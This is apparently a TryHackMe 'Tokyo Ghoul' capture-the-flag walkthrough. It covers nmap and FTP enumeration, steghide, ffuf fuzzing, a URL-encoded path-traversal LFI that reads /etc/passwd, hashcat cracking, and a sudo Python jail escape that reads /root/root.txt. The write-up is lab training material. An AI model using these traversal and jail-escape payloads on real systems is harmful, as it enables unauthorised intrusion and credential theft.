## Tokyo Ghoul
https://tryhackme.com/room/tokyoghoul666

### Enum
```
nmap -sC -sV ip.thm -T4
```
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-23 22:30 JST
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.4.63.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeIXT46ZiVmp8Es0cKk8YkMs3kwCdmC2Ve/0A0F7aKUIOlbyLc9FkbTEGSrE69obV3u6VywjxZX6VWQoJRHLooPmZCHkYGjW+y5kfEoyeu7pqZr7oA8xgSRf+gsEETWqPnSwjTznFaZ0T1X0KfIgCidrr9pWC0c2AxC1zxNPz9p13NJH5n4RUSYCMOm2xSIwUr6ySL3v/jijwEKIMnwJHbEOmxhGrzaAXgAJeGkXUA0fU1mTVLlSwOClKOBTTo+FGcJdrFf65XenUVLaqaQGytKxR2qiCkr7bbTaWV0F8jPtVD4zOXLy2rGoozMU7jAukQu6uaDxpE7BiybhV3Ac1x
|   256 ad:b7:a7:5e:36:cb:32:a0:90:90:8e:0b:98:30:8a:97 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC5o77nOh7/3HUQAxhtNqHX7LGDtYoVZ0au6UJzFVsAEJ644PyU2/pALbapZwFEQI3AUZ5JxjylwKzf1m+G5OJM=
|   256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOJwYjN/qiwrS4es9m/LgWitFMA0f6AJMTi8aHkYj7vE
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome To Tokyo goul
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
```
<html>
<head>
        <title>Welcome To Tokyo goul</title>
        <link rel="stylesheet" type="text/css" href="../css/mainstylesheet.css">
</head>
<body>

        <h1 style="text-align: center;">Kaneki </h1>
        <div class="center-wrapper">
                <img src="tokyo.gif">
        </div>

        <!-- look don't tell jason but we will help you escape we will give you the key to open those chains and here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there -->

        <br>
        <p>Ken Kaneki is a regular high school teenager who decides to go on a date with a girl named Rize Kamishiro. Kaneki fails to notice that there is something unusual about her. The girl then shows her true form and transforms into a ghoul who is hungry for Kaneki flesh. But suddenly, steel beams fall on her from the ceiling and she is instantly killed. Left in a very critical state, Ken is rushed to a hospital nearby. When he regains his consciousness, the doctor informs him that his organs have been replaced with that of Rize .</p>
        <br>
        <p>Kaneki is kidnapped by Jason. He then uses the most brutal ways to torture him by cutting off parts of him but gives him just enough time to regenerate again. While Kaneki seems to take the physical torture like a champ, he begins to struggle when he is reminded of the two other ghouls who gave him hopes of escaping.</p>

        <a href="jasonroom.html">Can you help him escape?</a>

</body>
</html>



 curl 10.10.241.159/jasonroom.html
<html>
<head>
        <title>Jason room</title>
        <link rel="stylesheet" type="text/css" href="../css/mainstylesheet.css">
</head>
<body>

        <h1 style="text-align: center;">Help him </h1>
        <div class="center-wrapper">
                <img src="jason.gif">
        </div>

        <!-- look don't tell jason but we will help you escape , here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there you will find a freind who will help you -->

</body>
</html>
```
```
ftp> open 10.10.241.159
Connected to 10.10.241.159.
220 (vsFTPd 3.0.3)
Name (10.10.241.159:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||43870|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
c226 Directory send OK.
ftp> cd need_Help?
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||49594|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           480 Jan 23  2021 Aogiri_tree.txt
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2021 Talk_with_me
226 Directory send OK.
ftp> mget Aogiri_tree.txt ./
226 Transfer complete.
ftp> cd Talk_with_me
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||46221|)
150 Here comes the directory listing.
-rwxr-xr-x    1 ftp      ftp         17488 Jan 23  2021 need_to_talk
-rw-r--r--    1 ftp      ftp         46674 Jan 23  2021 rize_and_kaneki.jpg
226 Directory send OK.
ftp> get rize_and_kaneki.jpg ./rize_and_kaneki.jpg
226 Transfer complete.
ftp> get need_to_talk ./need_to_talk
226 Transfer complete.
ftp> close
221 Goodbye.
```
🏴 I got three files,Aogiri_tree.txt,need_to_talk,rize_and_kaneki.jpg

```
cat Aogiri_tree.txt
```
```
Why are you so late?? i've been waiting for too long .
So i heard you need help to defeat Jason , so i'll help you to do it and i know you are wondering how i will.
I knew Rize San more than anyone and she is a part of you, right?
That mean you got her kagune , so you should activate her Kagune and to do that you should get all control to your body , i'll help you to know Rise san more and get her kagune , and don't forget you are now a part of the Aogiri tree .
Bye Kaneki.
```
```
file need_to_talk
```
```
need_to_talk: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=adba55165982c79dd348a1b03c32d55e15e95cf6, for GNU/Linux 3.2.0, not stripped
```
```
strings need_to_talk
```
```
/lib64/ld-linux-x86-64.so.2
mgUa
puts
putchar
stdin
printf
fgets
strlen
stdout
malloc
usleep
__cxa_finalize
setbuf
strcmp
__libc_start_main
free
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
Y********
d***
[]A\A]A^A_
k********
Hey Kaneki finnaly you want to talk
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?
Good job. I believe this is what you came for:
Hmm. I don't think this is what I was looking for.
Take a look inside of me. rabin2 -z
;*3$"
GCC: (Debian 9.3.0-15) 9.3.0
crtstuff.c
```
```
chmod +x need_to_talk
```

```
./need_to_talk
Hey Kaneki finnaly you want to talk
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> k********
Good job. I believe this is what you came for:
Y***********
```
🏴 I found username and pass? So let's investigate last one.

```
file rize_and_kaneki.jpg
rize_and_kaneki.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1024x576, components 3
```
```
steghide extract -sf rize_and_kaneki.jpg
```
![image](https://user-images.githubusercontent.com/6504854/180650485-4a034d2c-2ddd-49cd-bef4-69c1bdaae43c.png)

🏴 Mmmm,This is some directry or file?

```
curl http://10.10.11.29/d***************/

<html>
<head>
        <title>Scan me</title>
        <link rel="stylesheet" type="text/css" href="../css/mainstylesheet.css">
</head>
<body>

        <h1 style="text-align: center;">Scan me </h1>
        <div class="center-wrapper">
                <img src="scanme.gif">
        </div>
        <p> Scan me scan me scan all my ideas aaaaahhhhhhhh </p>
</body>
</html>
```

```
ffuf -u http://10.10.11.29/d***************/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -r -t 50
```
```
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 480ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 501ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 499ms]
claim                   [Status: 200, Size: 591, Words: 75, Lines: 17, Duration: 452ms]
index.html              [Status: 200, Size: 312, Words: 21, Lines: 15, Duration: 435ms]
:: Progress: [4712/4712] :: Job [1/1] :: 113 req/sec :: Duration: [0:00:42] :: Errors: 0 ::
```

```
curl http://10.10.11.29/d***************/claim -L
```
```
<html>
    <head>
        <link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans" rel="stylesheet">
        <link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
        <div class="menu">
            <a href="index.php">Main Page</a>
            <a href="index.php?view=flower.gif">NO</a>
            <a href="index.php?view=flower.gif">YES</a>
        </div>
 <p><b>Welcome Kankei-Ken</b><br><br>So you are here , you make the desision , you really want the power ?
 Will you accept me?
 Will accept your self as a ghoul?</br></p>
    <img src='https://i.imgur.com/9joyFGm.gif'>    </body>
</html>
```

```
GET /d***************/claim/index.php?view=../../../../../../../../../etc/passwd HTTP/1.1
Host: 10.10.11.29
Cookie: PHPSESSID=vhk6opj531miuvksdrtqcc3u43
Upgrade-Insecure-Requests: 1


HTTP/1.1 200 OK

<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=flower.gif">NO</a>
	    <a href="index.php?view=flower.gif">YES</a>
	</div>
no no no silly don't do that
```

```
GET /d***************/claim/index.php?view=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: 10.10.11.29
Cookie: PHPSESSID=vhk6opj531miuvksdrtqcc3u43
Upgrade-Insecure-Requests: 1


HTTP/1.1 200 OK

<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=flower.gif">NO</a>
	    <a href="index.php?view=flower.gif">YES</a>
	</div>
<p>root:x:0:0:root:/root:/bin/bash
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
k********:$6$
</p>    </body>
</html>
```
🏴 I got username and hash via LFI.

```
hashcat -m 1800 -a 0 hash /usr/share/wordlists/rockyou.txt
```

### Flag
```
ssh k********@ip.htm
```
```
sudo python3 /home/kamishiro/jail.py
[sudo] password for kamishiro:
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
```
https://anee.me/escaping-python-jails-849c65cf306e

Thank you for your time, Happy hacking. 😄

あー長いかったー、ずかれたー、最後めちゃきつい。考えたひと天才すぎ。

あーあー、桜島噴火したー。あー。
